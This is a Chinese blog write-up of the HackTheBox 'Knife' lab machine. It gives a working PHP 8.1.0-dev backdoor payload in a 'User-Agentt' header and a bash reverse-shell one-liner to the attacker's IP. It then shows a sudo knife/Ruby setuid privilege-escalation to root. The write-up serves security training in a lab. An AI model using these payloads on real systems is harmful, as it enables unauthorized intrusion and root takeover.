> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RwuQ3-7FRSFuFdHIK-T4QA)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

感谢群友 @rural 老哥的投稿，感谢分享 ![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeibyfk9D0ibkDtz55LQT8zLHC9SYk7SWIfYia8I7tCnZbEtiaHicHWA0sMmemsicdIic7yDFjPUqPtCPErg/640?wx_fmt=png) 。在这篇文章详细记录了他打 “HackTheBox-Knife” 靶场的整个过程，希望大家能够从中有所收获。![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOc5ZcSNTBqibEmpic3ibyWnkRLx9tqqTaZMhMEFGau1e7POs9LoCZzqlnOSyl2qO8KACkLY9h4ziaDBJQ/640?wx_fmt=png)  

首先连接 openvpn 实现访问到靶机

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtmSdx4J0pKxzCicJEXRmrgN8YDJMic6qFny6tbsvc23I8uum5ZAib0bHNA/640?wx_fmt=png)

ping 一下靶机地址测试网络连通

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtdG52Fggm3ATaUrYhKkDplznBdiciblBTe7tEibQhsBmMloiaESI0oUs5eg/640?wx_fmt=png)

nmap 来扫描服务器开了什么端口

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtqYhTZAbXmR0c4gRLtUjC6YzngMTtqvNibPbhuM4HLTMCd1iadWKDgEOQ/640?wx_fmt=png)

从这里可以看出靶机开了 22 和 80 端口，随手试了几个 ssh 的弱口令没啥用，只能从 80 端口入手了，先访问网站

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqt9sEn5ZK96kWRkz6U9XUg0m7ticqy0IZticBQxUfvMtpicMWXODaCMUgcw/640?wx_fmt=png)

首页没发现可以利用的地方，再用 dirsearch 扫一波目录

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtccMich4ibyEKTiaWM5iaribulPgCkgU4rEmoFWs0FZic50jvo4ibov1kybPyg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtpU0ian0Cn1RvJWOniaVF1HiccQ3KXJsDQ1Sp6k7Kib4lXuUojyLibFIbmJw/640?wx_fmt=png)

扫描出来的目录访问之后没啥作用，我们来识别一波 CMS 用 kali 的 whatweb 来识别一波

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtnrF9bJI3bzkicCwVEvQibzyfRM286vuRztbCcj1fFXVPGSmOe4uglabw/640?wx_fmt=png)

这里看到了 X-Powered-By[PHP/8.1.0-dev] 不同寻常百度之后果然有问题，X-Powered-By 是响应头里面的内容会泄露 php 的版本信息，而 PHP/8.1.0-dev 这个版本的 php 会有一个后门

漏洞描述

PHP 8.1.0-dev 版本在 2021 年 3 月 28 日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送 User-Agentt 头来执行任意代码。

这边我们直接抓包并发送到重发器试试命令执行的结果

```
User-Agentt: zerodiumsystem("ifconfig");
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtSica26BfrkPicD4LxdqWYmC0hJng979lH2nKtK4ibTX4lQyNt3uvnKiaTg/640?wx_fmt=png)

现在就好办了直接反弹 shell，本机 vpn 的 ip

```
bash -c 'exec bash -i &>/dev/tcp/10.10.14.3/4444 <&1'
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtqCyYdAQMdicK1kV7Ka1LGsfLVBADnHET9PI7NAwQYtia0tkK5hsfnwHw/640?wx_fmt=png)

而我们在本机用执行 nc 监听端口

```
nc -nvlp 4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtG3ic9TBwMCgKWQcOwPxF7sDQOOmlIN5FVwB8yaDrnfswycVzJFnVI6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtKwZgic4Ut4ABaB4UmdDOf7uZx3xkh2CpePNTmPDNexE94lao3ibgicQ2Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtxJSmGGHrSO4ndWPAhKOEectqckyMqicSro3DCibribreI8nONO9iaCwbgg/640?wx_fmt=png)

得到反弹的 shell，权限并不高，而且 nc 的 shell 不好用，所以用 python 来得到一个更好用的 shell，好多语言都可以调用 shell，你现在 linux 系统基本自带 python 所以 python 更加方便

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

which python 可以查看有没有 python 语言环境，这里有 python3 环境

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtTUwdPHEfWeg3bgZyHEPq6eWXbrmfINnYEibk9gRg65XXB2qbiavRgscg/640?wx_fmt=png)

我们执行语句获取 shell

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtbtibuJXqZlERSNcBQ5WfDQMSGPPiaicMtjhprNvqXk7JH9ibgmyibiaG2Nqg/640?wx_fmt=png)

此用户权限较低，我们来提权

```
sudo -l     可以知道我们了不用root密码来执行某些文件
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtmcEwBqF2YcRw1nGg0ibtz3xG4rGMxibPIjHwLeIeYaU0yOwF7Rx49tJw/640?wx_fmt=png)

这边可以无密执行 / usr/bin/knife 文件，查看文件发现是 ruby 脚本的文件

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqt1US5MPW2XfFESKicuCmIEw9SrfvZfN14UOwxEcwic594ib5kQ3bZyIFrQ/640?wx_fmt=png)

搜索了一下这个文件是一个 ruby 的包运行之后提示需要传递一个子命令

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqt6Vq7dkTg8WCCUWg9Y9rhBNYQZDC7AKLYkcoQLeaQRibGlPFsZd3LqXg/640?wx_fmt=png)

这边是个 setuid 的提权，我找的了一个大佬的解释：

setuid

setuid 是类 unix 系统提供的一个标志位， 其实际意义是 set 一个 process 的 euid 为这个可执行文件或程序的拥有者 (比如 root) 的 uid， 也就是说当 setuid 位被设置之后， 当文件或程序 (统称为 executable) 被执行时, 操作系统会赋予文件所有者的权限, 因为其 euid 是文件所有者的 uid

**举个例子**

setuid 的方法是使用 Linux 的 chmod 指令，我们都习惯给予一个文件类似 “0750” “0644” 之类的权限，它们的最高位 0 就是 setuid 的位置, 我们可以通过将其设为 4 来设置 setuid 位。（tips：设置为 2 为 setgid，同 setuid 类似，即赋予文件所在组的权限）。

```
chmod 4750 文件名
or
chmod u+s 文件名
```

在这个命令执行之后， 我们再通过 ls -l 命令查看文件时， 可以发现文件 owner 权限的 x 位变成了 s ，这就说明 setuid 权限已经被设置， 之后任何 user 执行这个文件时（user 需要有文件的执行权限）， 都会以 root 的权限运行（此文件的 owner 为 root）。所以，针对一个需要被很多 user 以 root 权限执行的文件， 我们可以通过 setuid 来进行操作， 这样就不必为所有 user 都添加 sudo 命令。

**tips**

在使用 setuid 时， 需要保证此文件有被执行的权限（x）， 如果没有执行权限。在使用 ls -l 查看权限时， 会发现 setuid 位被设置为了大写的 S， 这说明 setuid 位没有被设置成功。

原文链接：

https://blog.csdn.net/weixin_44575881/article/details/86552016

这边继续来提权，ruby 执行命令方法 exec，system，和 %x。我们写一个赋予 / bin/bash setuid 的脚本

```
echo “system(‘chmod +s /bin/bash’)” > j.rb
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtXqa8At8gV23MXUECvq1LPnD5bnz84kACPKibuWyk0iaO9s1qWRvOSAgQ/640?wx_fmt=png)

我们 james 用户具有执行 knife 的权限并且是以 root 权限运行，所以写一个脚本来给 / bin/bash / 赋予 setuid 位

```
sudo /usr/bin/knife exec j.rb   通过knife执行我们写的脚本
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtWzAxmn61ku45TZsIiaO6lEhLicEL1rootImcpXPpr3ciaBN04cNPFgibjQ/640?wx_fmt=png)

sudo 是 linux 系统管理指令，是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具

```
/bin/bash -p
```

–posix 这个指令是需要用到 root 权限的，由于设置了 setuid 所以实现了提权

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtv8tO5eLWVpozSyTck8U1P86eKarR9Y3JrMybgjZFoauHI5T2FCyneA/640?wx_fmt=png)

这样就可以拿到两个 flag 了

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtMicKOPn0rPZ0TYGw4MHicmViaAEZEzjBppH3O2XCu407sjgvM5iciaxE6hA/640?wx_fmt=png)

最后提交拿到胜利！！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfEfywvAxibqAWOzic0rDicqqtlficz9vl67U8X4TlnVeiaHx7F9GQp2l3kvaFnibUU9kFygSaRfxV08bmg/640?wx_fmt=png)

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考等安全杂志 PDF 电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

公众号

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)